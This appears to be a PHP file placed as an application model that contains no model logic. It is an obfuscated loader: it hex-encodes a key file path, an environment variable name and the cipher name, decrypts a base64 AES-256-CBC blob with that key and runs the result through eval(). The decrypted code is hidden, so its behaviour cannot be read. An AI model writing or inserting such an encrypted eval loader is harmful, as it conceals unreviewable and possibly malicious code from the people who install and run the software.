<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('1tgA4spsNnMfy62mrwJZ0A==');

$c=base64_decode(

'yEfy7PII3QHYeoXdKi4yDxLQfp0iA4hP2nsHAw1Ns2UEjKNIUGZffBRij9Y8+tqrM8iyZHmjlRCM' .
'sGKvMYqUXXBjVeO6ISRcvzBFcFqupSKrmS3cBNb++9LDmd73J+ITMk5YLcRXJCSspuVZuoLW+ZHn' .
'4iVsrvqd3wfb83TsPtdIlovAMR4GbVgQdwxAr4NVEoP9nQVCbsMy7MD8Le5KgwlCO/aZXIAPYx0Q' .
'0ztnR2TMUSaBj8cZh6DMps5x0hEnuxZxcWN4QQHGXqV3/03hXQRUikyhbSzlVXT6osH2Xplya5bj' .
'I3olDQ9ahbSVUuYrMDdBYHENRENXG0pJ65+A2d35PEsK/pHqIltRWQVOKiy2VGBq6Dk1dIOu6N+E' .
'dbVn6hMajSaJ6+ISmF2jbz1hQybfNW2cfpL0mmwHN36l8LpLKtkZ4vbfd2TYnliYNLYKlGOTk9BB' .
'WWF2Ek84ct7gE9FO3mDpiOjgl7JaaIen30a8HzH3cuO+Rt4pjmReOEEtnBjJekQwzf884b0b//P2' .
'rcxdapNRyphPp0CrK6BM18Lj4lGHLjTlMMEo38U/8U86/38cv67BSerEAAiDdQGY0bmh8PJl50/v' .
'fcgStFxr1952j1HloGz6c9Ps/iQ69MLQnPpitWbAErCgok+avzvwYoLHF0N7z+mDKTCk6kG3rMDN' .
'rZxxr+AoP51np5LKSiYGUtVRIjJsFXtpjB2/K1EB8HW6DbVpl6f6xiG5AqvjTbe6N6xkA0DkZzE0' .
'6bz9vSh6OQNNSY98DvXUZveKPnil5Q=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

